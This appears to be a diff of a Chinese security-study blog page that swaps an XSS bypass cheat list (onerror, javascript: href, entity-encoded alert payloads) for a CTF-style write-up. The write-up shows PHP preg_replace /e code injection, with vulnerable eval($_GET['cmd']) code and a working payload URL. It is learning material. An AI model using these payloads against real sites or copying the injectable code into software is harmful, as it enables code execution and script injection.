@@ -19,21 +19,23 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="fuzz: 1&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF&#x3D;javascript:alert()&gt; &amp;#106;   闭合标签之后 onfocus属性 javascript协议 javascript:alert(0), 另外由于href可以自动解码unicode，因">
+    <meta name="description" content="preg_match的&#x2F;e模式文章 preg_match(pattern, 替换成的字符串, str)当pattern中采用了&#x2F; &#x2F; ..e模式时，每当str中匹配到pattern，就会把参数2当做代码执行。  参数2可控 —&gt; 直接执行命令 参数2固定格式，如  12345678910111213function complex($re, $str) &amp;#12">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mekrina">
-<meta property="og:url" content="http://mekrina.github.io/blogs/uncategorized/xss/index.html">
+<meta property="og:title" content="php命令执行函数">
+<meta property="og:url" content="http://mekrina.github.io/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="fuzz: 1&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF&#x3D;javascript:alert()&gt; &amp;#106;   闭合标签之后 onfocus属性 javascript协议 javascript:alert(0), 另外由于href可以自动解码unicode，因">
+<meta property="og:description" content="preg_match的&#x2F;e模式文章 preg_match(pattern, 替换成的字符串, str)当pattern中采用了&#x2F; &#x2F; ..e模式时，每当str中匹配到pattern，就会把参数2当做代码执行。  参数2可控 —&gt; 直接执行命令 参数2固定格式，如  12345678910111213function complex($re, $str) &amp;#12">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-08T03:51:01.127Z">
-<meta property="article:modified_time" content="2025-01-13T09:19:14.442Z">
+<meta property="og:image" content="http://mekrina.github.io/blogs/image.png">
+<meta property="article:published_time" content="2025-03-08T03:51:01.582Z">
+<meta property="article:modified_time" content="2025-03-08T04:15:47.127Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://mekrina.github.io/blogs/image.png">
   
   
   
-  <title>mekrina</title>
+  <title>php命令执行函数 - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="php命令执行函数"></span>
           
         </div>
 
@@ -222,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          245 字
+          405 字
         
       </span>
     
@@ -233,7 +235,7 @@
         
         
         
-          3 分钟
+          4 分钟
         
       </span>
     
@@ -270,34 +272,23 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">php命令执行函数</h1>
             
             
               <div class="markdown-body">
                 
-                <p>fuzz:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span> </span></span><br></code></pre></td></tr></table></figure>
+                <h2 id="preg-match的-e模式"><a href="#preg-match的-e模式" class="headerlink" title="preg_match的&#x2F;e模式"></a>preg_match的&#x2F;e模式</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">文章</a></p>
+<p>preg_match(pattern, 替换成的字符串, str)<br>当pattern中采用了&#x2F; &#x2F; ..e模式时，每当str中匹配到pattern，就会把参数2当做代码执行。</p>
 <ol>
-<li>闭合标签之后<script></script></li>
-<li>onfocus属性</li>
-<li>javascript协议 javascript:alert(0), 另外由于href可以自动解码unicode，因此编码成如下结果也是有效的。</li>
+<li>参数2可控 —&gt; 直接执行命令</li>
+<li>参数2固定格式，如</li>
 </ol>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure>
-<ol start="4">
-<li>type&#x3D;”hidden”的情况可以在前面插入一个type，会忽略掉第二个type</li>
-<li>大小写绕过 <Script></ScrIpt>也有效</li>
-<li>onerror属性</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt; 欢迎用户&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>传入：</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure>
-<p>同理：onmouseover等属性也可以</p>
-<ol start="8">
-<li>双写绕过</li>
-<li>ng-include传递一个有xss的外部页面，再对传入的页面进行触发。传入文件时需要引号包围<br>![[Pasted image 20241229211503.png]]<br>默认情况下，包含的文件需要包含在同一个域名下<br>![[Pasted image 20250113002903.png]]</li>
-<li>图片xss<br>![[Pasted image 20250113001101.png]]</li>
-<li>回车可以代替空格</li>
-</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">url?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls&quot;)<br></code></pre></td></tr></table></figure>
+<p><code>\\1</code>是正则表达式中的第一个捕获项，由于表达式是(\S*)，$str均被匹配,因此<br>执行的是<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code><br>接下来回答以下几个问题<br><strong>Q1：</strong> 为什么不使用.*匹配<br>A: 以下这些字符作为变量名时,会被替换成’_’,其中就包括了字符’.’<br><img src="/blogs/image.png" srcset="/blogs/img/loading.gif" lazyload alt="alt text"></p>
+<p><strong>Q2:</strong> 为什么要用${getFlag()}而不用getFlag()?<br>A: 因为如果用后者,那么将执行<code>strtolower(&quot;getFlag()&quot;)</code>,其中getFlag()只是普通的字符串.而执行<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code>, 其中${}的格式是<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.variable.php">可变变量</a><br>,也就是会先自动解析{}中的变量,然后再把它作为变量名.显然$flag{…}是未定义的变量,也就是null.所以得到flag依赖于getFlag()函数中将flag打印出来<br><strong>Q3:</strong> 为什么不能直接<code>url?\S*=$&#123;system(&#39;ls&#39;)&#125;</code>?<br>A: 经测试会报错 unexpected “ls”</p>
+<p>可能与<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code>中把<code>&#39;</code>和<code>&quot;</code>都用掉了有关系,导致<br>$str这个参数不能出现引号.</p>
+<p>奇怪的是<code>url?\S*=$&#123;system(ls)&#125;</code>意外的可以运行<br>但是<code>ls /</code>又不能运行, … 暂时不深究</p>
 
                 
               </div>
@@ -305,6 +296,27 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/blogs/categories/php/" class="category-chain-item">php</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -315,8 +327,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>http://mekrina.github.io/blogs/uncategorized/xss/</div>
+      <div>php命令执行函数</div>
+      <div>http://mekrina.github.io/blogs/php/php命令执行函数/</div>
     </div>
     <div class="license-meta">
       
@@ -360,9 +372,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/uncategorized/tricks/" title="">
+                      <a href="/blogs/uncategorized/%E5%8F%8D%E5%90%91shell/" title="反向shell">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile"></span>
+                        <span class="hidden-mobile">反向shell</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -370,8 +382,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/uncategorized/XXE/" title="">
-                        <span class="hidden-mobile"></span>
+                      <a href="/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" title="SSTI模版注入">
+                        <span class="hidden-mobile">SSTI模版注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
